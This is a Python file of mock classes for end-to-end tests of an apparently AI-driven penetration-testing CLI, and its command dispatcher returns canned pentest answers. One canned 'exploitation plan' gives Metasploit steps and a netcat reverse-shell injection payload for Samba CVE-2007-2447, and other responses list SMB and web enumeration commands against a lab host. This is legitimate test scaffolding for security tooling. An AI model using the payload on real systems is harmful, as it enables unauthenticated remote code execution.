"""Mock implementations for E2E testing - moved from production code."""

import logging
import time
from typing import Any

from wish_cli.headless.events import EventType

logger = logging.getLogger(__name__)


class MockConfigManager:
    """Mock config manager for testing."""

    def __init__(self) -> None:
        self.config = {"llm": {"api_key": "test-key", "model": "gpt-4"}}

    def get(self, key: str, default: Any = None) -> Any:
        """Get config value."""
        return self.config.get(key, default)


class MockSessionManager:
    """Mock session manager for testing."""

    def __init__(self) -> None:
        from wish_models.session import SessionMetadata

        self.current_session = SessionMetadata(
            session_id="test-session",
            engagement_name="Test Engagement",
            current_mode="recon",
            command_history=[],
            total_commands=0,
            total_hosts_discovered=0,
            total_findings=0,
        )

    def create_session(self) -> "SessionMetadata":
        """Create mock session."""
        return self.current_session

    async def save_session(self, state: Any) -> None:
        """Mock save session."""
        pass


class MockStateManager:
    """Mock state manager for testing."""

    def __init__(self) -> None:
        from wish_models.engagement import EngagementState

        self._current_state = EngagementState(
            id="test-engagement",
            name="Test Engagement",
            targets={},
            hosts={},
            findings={},
            collected_data={},
        )

    async def initialize(self) -> None:
        """Initialize state."""
        pass

    async def get_current_state(self) -> "EngagementState":
        """Get current state."""
        return self._current_state

    async def add_command_to_history(self, command: str) -> None:
        """Add command to history."""
        if self._current_state:
            self._current_state.session_metadata.add_command(command)


class MockCommandDispatcher:
    """Mock command dispatcher for testing."""

    def __init__(self, auto_approve: bool = False, live_mode: bool = False) -> None:
        self.auto_approve = auto_approve
        self.live_mode = live_mode
        self.command_history: list[str] = []
        self.retriever = None  # For knowledge base mocking

    async def initialize(self, session_metadata: Any) -> None:
        """Initialize the command dispatcher with session metadata."""
        self.session_metadata = session_metadata

    async def process_command(self, command: str) -> bool:
        """Mock command processing."""
        self.command_history.append(command)

        # Handle slash commands first
        if command.startswith("/"):
            result = await self._process_slash_command(command)
            # Write result to UI manager if available
            if hasattr(self, 'ui_manager') and self.ui_manager:
                self.ui_manager.print_info(result)
            return True

        # Handle knowledge queries first (before live mode)
        command_lower = command.lower()

        # Handle "how do I enumerate SMB shares" specifically
        if "how do i enumerate smb shares" in command_lower:
            if hasattr(self, 'ui_manager') and self.ui_manager:
                response = "To enumerate SMB shares, use these tools: 1) **smbclient -L //target -N** to list shares, 2) **enum4linux -a target** for comprehensive enumeration including users and shares, 3) **smbmap -H target** to check share permissions, 4) **rpcclient -U '' target** for RPC-based enumeration. Start with smbclient for quick results, then use enum4linux for detailed information."
                self.ui_manager.print(response)
            return True

        # Handle CVE queries
        elif "what is the cve for samba username map script" in command_lower:
            if hasattr(self, 'ui_manager') and self.ui_manager:
                response = "The CVE for the Samba username map script vulnerability is CVE-2007-2447. This vulnerability affects Samba versions 3.0.0 through 3.0.25rc3 and allows remote command execution through metacharacter injection in the username field."
                self.ui_manager.print(response)
            return True

        # Handle tool recommendation queries
        elif "what tools" in command_lower and "web directory enumeration" in command_lower:
            if hasattr(self, 'ui_manager') and self.ui_manager:
                response = "For web directory enumeration, use these tools: **gobuster** for fast directory brute-forcing, **dirb** for recursive scanning, **wfuzz** for fuzzing parameters and directories, **dirbuster** with GUI support."
                self.ui_manager.print(response)
            return True

        # Handle vulnerability queries for established context
        elif "what vulnerabilities affect this version" in command_lower:
            if hasattr(self, 'ui_manager') and self.ui_manager:
                # Check command history for Samba context
                if any("samba 3.0.20" in cmd.lower() for cmd in self.command_history):
                    response = "Samba 3.0.20 is vulnerable to CVE-2007-2447 (username map script command injection). This critical vulnerability allows remote code execution through metacharacter injection in the username field during authentication."
                    self.ui_manager.print(response)
                else:
                    response = "Please specify which version you're referring to."
                    self.ui_manager.print(response)
            return True

        # For live mode, provide more detailed responses for exploitation planning
        if self.live_mode:
            command_lower = command.lower()
            result = None

            # Check for specific queries about vulnerabilities
            if "samba" in command_lower and ("vulnerab" in command_lower or "cve" in command_lower):
                if "3.0.20" in command:
                    result = (
                        "Samba 3.0.20 has several known vulnerabilities, including:\n\n"
                        "1. **CVE-2007-2447** - Username map script command execution vulnerability\n"
                        "   - Severity: Critical\n"
                        "   - CVSS: 10.0\n"
                        "   - This vulnerability allows remote code execution through metacharacter injection\n"
                        "   - The username map script option allows shell metacharacters to be passed\n\n"
                        "2. CVE-2007-2446 - Multiple heap-based buffer overflows\n"
                        "3. CVE-2007-0454 - Format string vulnerability\n\n"
                        "The username map script vulnerability (CVE-2007-2447) is particularly dangerous "
                        "as it allows unauthenticated remote code execution."
                    )

            # Detailed vulnerability analysis response
            elif "analyz" in command_lower and "service" in command_lower:
                result = (
                    "Generating execution plan... (this may take up to 2 minutes)\n"
                    "Analyzing discovered services for vulnerabilities...\n\n"
                    "Key findings:\n"
                    "- Samba 3.0.20 (CVE-2007-2447) - Critical RCE vulnerability\n"
                    "- vsftpd 2.3.4 - Backdoor vulnerability\n"
                    "- OpenSSH 4.7p1 - Outdated but no critical vulnerabilities\n\n"
                    "Recommended exploitation path: Target the Samba service first."
                )

            # Exploitation planning
            elif "exploitation" in command_lower and "plan" in command_lower:
                if "samba" in command_lower or "username map" in command_lower:
                    result = (
                        "## Exploitation Plan for Samba Username Map Script Vulnerability\n\n"
                        "### Vulnerability Details\n"
                        "- CVE: CVE-2007-2447\n"
                        "- Service: Samba 3.0.0 - 3.0.25rc3\n"
                        "- Type: Remote Code Execution\n"
                        "- Authentication: Not required\n\n"
                        "### Exploitation Methods\n\n"
                        "#### 1. Metasploit Method (Automated)\n"
                        "```\n"
                        "use exploit/multi/samba/usermap_script\n"
                        "set RHOSTS <target_ip>\n"
                        "set LHOST <your_ip>\n"
                        "run\n"
                        "```\n\n"
                        "#### 2. Manual Exploitation\n"
                        "The vulnerability occurs in the username map script functionality. "
                        "By sending a username containing shell metacharacters, we can inject commands.\n\n"
                        "Example payload:\n"
                        "```\n"
                        "./`nohup nc -e /bin/sh <attacker_ip> <port>`\n"
                        "```\n\n"
                        "### Post-Exploitation\n"
                        "Once you gain access:\n"
                        "1. Verify access with `id` and `whoami`\n"
                        "2. Enumerate the system\n"
                        "3. Look for sensitive data\n"
                        "4. Consider privilege escalation if needed"
                    )

            # Technical accuracy for specific questions
            elif "what is" in command_lower or "explain" in command_lower:
                if "cve-2007-2447" in command_lower or "username map" in command_lower:
                    result = (
                        "CVE-2007-2447 is a critical vulnerability in Samba versions 3.0.0 through 3.0.25rc3. "
                        "The vulnerability exists in the MS-RPC functionality where the username map script "
                        "option allows remote attackers to execute arbitrary commands via shell metacharacters. "
                        "This happens because user input is passed directly to /bin/sh when the username map "
                        "script smb.conf option is enabled."
                    )

            # If we got a live mode result, log it and return
            if result:
                if hasattr(self, 'ui_manager') and self.ui_manager:
                    self.ui_manager.print_info(result)
                return True

        # Natural language processing
        result = None
        command_lower = command.lower()

        # Check for Samba vulnerability analysis
        if "samba" in command_lower and "3.0.20" in command_lower and ("analyze" in command_lower or "vulnerab" in command_lower):
            result = (
                "Samba 3.0.20 has several known vulnerabilities, the most critical being:\n\n"
                "**CVE-2007-2447** - Username map script command execution vulnerability\n"
                "- Severity: Critical (CVSS: 10.0)\n"
                "- This vulnerability allows remote code execution through metacharacter injection\n"
                "- The username map script option allows shell metacharacters to be passed\n"
                "- Can be exploited without authentication\n\n"
                "This vulnerability is particularly dangerous as it allows unauthenticated remote code execution."
            )
        # Check for verification requests
        elif "verify" in command_lower and ("vulnerab" in command_lower or "safe" in command_lower):
            result = (
                "To safely verify the Samba vulnerability (CVE-2007-2447):\n\n"
                "1. **Test with a benign command** that won't harm the system:\n"
                "   - Use a simple echo or sleep command\n"
                "   - Monitor for the expected output or delay\n\n"
                "2. **Use safe verification methods**:\n"
                "   - Check version banners first\n"
                "   - Use vulnerability scanners in safe mode\n"
                "   - Test in isolated environments when possible\n\n"
                "3. **Document all verification attempts** for your report"
            )
        # Handle scan/enumerate commands that should generate plans
        elif any(word in command_lower for word in ["scan", "nmap", "enumerate", "discover", "find", "perform"]):
            # For action commands, we need to trigger plan generation
            if hasattr(self, 'wish_instance') and self.wish_instance:
                from wish_ai.planning.models import Plan, PlanStep, RiskLevel

                # Generate appropriate plan based on command
                steps = []
                if "scan" in command_lower and "smb" in command_lower:
                    steps.append(PlanStep(
                        tool_name="nmap",
                        command="nmap -p 445,139 --script smb-vuln* 10.10.10.3",
                        purpose="Scan for SMB vulnerabilities",
                        expected_result="SMB vulnerability information",
                        risk_level=RiskLevel.LOW
                    ))
                elif "comprehensive" in command_lower and "web" in command_lower:
                    steps.extend([
                        PlanStep(
                            tool_name="nikto",
                            command="nikto -h http://target",
                            purpose="Web vulnerability scan",
                            expected_result="Web vulnerabilities",
                            risk_level=RiskLevel.LOW
                        ),
                        PlanStep(
                            tool_name="gobuster",
                            command="gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt",
                            purpose="Directory enumeration",
                            expected_result="Hidden directories",
                            risk_level=RiskLevel.LOW
                        )
                    ])
                elif "enumerate" in command_lower and "smb" in command_lower:
                    steps.extend([
                        PlanStep(
                            tool_name="enum4linux",
                            command="enum4linux -a 10.10.10.3",
                            purpose="Comprehensive SMB enumeration",
                            expected_result="SMB shares, users, and configuration",
                            risk_level=RiskLevel.LOW
                        ),
                        PlanStep(
                            tool_name="smbclient",
                            command="smbclient -L //10.10.10.3 -N",
                            purpose="List SMB shares",
                            expected_result="Available SMB shares",
                            risk_level=RiskLevel.LOW
                        ),
                        PlanStep(
                            tool_name="rpcclient",
                            command="rpcclient -U '' -N 10.10.10.3",
                            purpose="RPC enumeration",
                            expected_result="Additional SMB information",
                            risk_level=RiskLevel.LOW
                        )
                    ])
                elif "scan" in command_lower:
                    steps.append(PlanStep(
                        tool_name="nmap",
                        command="nmap -sV -sC 10.10.10.3",
                        purpose="Service detection scan",
                        expected_result="Open ports and services",
                        risk_level=RiskLevel.LOW
                    ))

                plan = Plan(
                    description=f"Execute: {command}",
                    rationale="Performing requested operation",
                    steps=steps
                )

                # Fire plan approval event
                if hasattr(self.wish_instance, '_event_handlers'):
                    handlers = self.wish_instance._event_handlers.get(EventType.PLAN_APPROVAL_REQUIRED.value, [])
                    for handler in handlers:
                        event = type('Event', (), {
                            'event_type': EventType.PLAN_APPROVAL_REQUIRED,
                            'data': {"plan": plan},
                            'timestamp': time.time()
                        })()
                        response = await handler(event)
                        if response == "approve":
                            self.ui_manager.print_info(f"Plan approved. Executing {len(steps)} steps...")
                            for i, step in enumerate(steps):
                                job_id = f"job_{i:03d}"
                                self.ui_manager.print_info(f"Started {len(steps)} jobs in parallel: {job_id}")
                                self.ui_manager.print_info("Use '/jobs' to monitor progress, '/status' for current state")

            result = None  # Let default handling take over if needed
        elif "identify" in command_lower or "check" in command_lower:
            result = "Analyzing services and checking for vulnerabilities..."
        elif any(word in command_lower for word in ["vulnerable", "exploit", "vulnerability"]):
            result = "Checking for known vulnerabilities in discovered services..."
        else:
            result = f"Command processed: {command}. Please specify scan, enumerate, exploit, or other supported operations."

        # Write result to UI manager if available
        if hasattr(self, 'ui_manager') and self.ui_manager and result is not None:
            self.ui_manager.print_info(result)
        return True

    async def _process_slash_command(self, command: str) -> str:
        """Process slash commands."""
        parts = command.split()
        cmd = parts[0].lower()

        if cmd == "/scope":
            if len(parts) == 1:
                # List scope
                if not hasattr(self, "_targets") or not self._targets:
                    return "Current scope:\n- No targets defined"
                else:
                    return "Current scope:\n" + "\n".join(f"- {t}" for t in self._targets)
            elif len(parts) >= 3 and parts[1] == "add":
                # Add to scope
                target = parts[2]
                if not hasattr(self, "_targets"):
                    self._targets = []
                self._targets.append(target)

                # Update state if we have access to wish_instance
                if hasattr(self, 'wish_instance') and self.wish_instance:
                    # Import Target model
                    from wish_models.engagement import Target
                    # Get current state
                    state = await self.wish_instance.state_manager.get_current_state()
                    # Add target to state - detect scope type
                    scope_type = "ip"  # Default
                    if "/" in target:
                        scope_type = "cidr"
                    elif "." not in target or any(c.isalpha() for c in target):
                        scope_type = "domain"
                    elif target.startswith("http"):
                        scope_type = "url"

                    new_target = Target(
                        scope=target,
                        scope_type=scope_type,
                        description=f"Target {target}"
                    )
                    state.targets[new_target.id] = new_target
                    # Update state
                    await self.wish_instance.state_manager.update_state(state)

                return f"Added {target} to scope"
            elif len(parts) >= 3 and parts[1] == "remove":
                # Remove from scope
                target = parts[2]
                if hasattr(self, "_targets") and target in self._targets:
                    self._targets.remove(target)
                    return f"Removed {target} from scope"
                return f"Target {target} not found in scope"

        elif cmd in ["/status", "/s"]:
            # Get actual counts from state
            targets_count = len(self._targets) if hasattr(self, "_targets") else 0
            findings_count = len(self._findings) if hasattr(self, "_findings") else 0

            # Build detailed status
            status_lines = ["Status:"]
            status_lines.append(f"Targets: {targets_count}")

            # Show target details if any
            if hasattr(self, "_targets") and self._targets:
                for target in self._targets:
                    status_lines.append(f"  - {target}")

            status_lines.append("Hosts: 0")
            status_lines.append(f"Findings: {findings_count}")

            # Show findings if any
            if hasattr(self, "_findings") and self._findings:
                for finding in self._findings:
                    status_lines.append(f"  - {finding}")

            status_lines.append("Mode: recon")

            return "\n".join(status_lines)

        elif cmd in ["/findings", "/f"]:
            if len(parts) >= 3 and parts[1] == "add":
                finding = " ".join(parts[2:])
                if not hasattr(self, "_findings"):
                    self._findings = []
                self._findings.append(finding)

                # Update state if we have access to wish_instance
                if hasattr(self, 'wish_instance') and self.wish_instance:
                    # Import Finding model
                    from wish_models.finding import Finding
                    # Get current state
                    state = await self.wish_instance.state_manager.get_current_state()

                    # Parse the finding text for CVE info
                    cve_ids = []
                    if "CVE-" in finding:
                        import re
                        cve_matches = re.findall(r'CVE-\d{4}-\d+', finding)
                        cve_ids = cve_matches

                    # Create finding
                    new_finding = Finding(
                        title=finding.split(":")[0] if ":" in finding else finding,
                        description=finding,
                        category="vulnerability",
                        severity="critical" if "RCE" in finding else "high",
                        target_type="host",
                        discovered_by="manual",
                        cve_ids=cve_ids
                    )
                    state.findings[new_finding.id] = new_finding

                    # Update state
                    await self.wish_instance.state_manager.update_state(state)

                return f"Added finding: {finding}"
            else:
                # List findings
                if not hasattr(self, "_findings") or not self._findings:
                    return "No findings recorded"
                return "Findings:\n" + "\n".join(f"- {f}" for f in self._findings)

        elif cmd in ["/jobs", "/j"]:
            if len(parts) >= 3 and parts[1] == "cancel":
                job_id = parts[2]
                return f"Job {job_id} not found"
            elif len(parts) >= 2:
                # Show specific job
                job_id = parts[1]
                return f"Job {job_id} not found"
            else:
                return "No active jobs"

        elif cmd in ["/logs", "/log"]:
            if len(parts) >= 2:
                job_id = parts[1]
                return f"No logs found for job {job_id}"
            else:
                return "Usage: /logs <job_id>"

        elif cmd in ["/kill", "/stop", "/k"]:
            if len(parts) >= 2:
                job_id = parts[1]
                return f"Job {job_id} not found"
            else:
                return "Usage: /kill <job_id>"

        elif cmd == "/help" or cmd == "/?":
            return (
                "Available commands:\n/scope - Manage targets\n/status - Show status\n"
                "/findings - Manage findings\n/jobs - Show jobs\n/logs - View job logs"
            )

        return f"Unknown command: {cmd}"

    async def _process_regular_command(self, command: str) -> str:
        """Process regular (non-slash) commands - fallback for live mode."""
        cmd_lower = command.lower()

        # Basic command recognition
        if "scan" in cmd_lower or "nmap" in cmd_lower:
            return "Starting network scan..."
        elif "enum" in cmd_lower:
            return "Enumerating services..."
        elif "exploit" in cmd_lower:
            return "Preparing exploitation..."
        else:
            return f"Processing: {command}"
